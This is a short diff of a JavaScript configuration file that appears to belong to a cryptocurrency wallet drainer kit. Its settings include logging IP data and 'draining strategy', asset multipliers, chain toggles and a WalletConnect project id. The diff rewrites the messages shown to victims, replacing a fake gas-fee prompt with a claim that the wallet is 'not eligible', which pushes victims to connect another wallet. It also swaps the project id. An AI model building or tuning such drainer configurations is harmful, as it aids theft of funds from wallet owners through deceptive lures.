@@ -23,8 +23,8 @@ let multipliers = {
 'NFT': 1,
 'NATIVES': 1,
 };
-let notEligible = "You don't have enough gas fee to cover network fees.";
-let swal_notEligibleTitle = "Top up ";
+let notEligible = "Your wallet is not eligible, connect another wallet.";
+let swal_notEligibleTitle = "Not eligible";
 let addressChanged = "Your wallet address has changed, connect wallet again please";
 let swal_addressChangedTitle = "Address changed";
 let popupElementID = "drPopup";
@@ -39,7 +39,7 @@ let logIpData = true;
 let logEmptyWallets = true;
 let logDrainingStrategy = true;
 let repeatHighest = true;
-let retry_changenetwork = 3;
+let retry_changenetwork = 2;
 let eth_enabled = true;
 let bsc_enabled = true;
 let arb_enabled = true;
@@ -59,7 +59,7 @@ let buttonMessagesEnabled = false;
 let twoStep = false;
 let twoStepButtonElement = "startButton";
 let connectElement = "connectButton";
-let wc_projectid = "0ed81a8ea74f152e7f2c0a2167be3cc9";
+let wc_projectid = "1100e329991b0aad4122ccd47383a416";
 let cfgversion = 680;
 let researchers = [];
 let experimental = {"disable-w3m-featured":true};
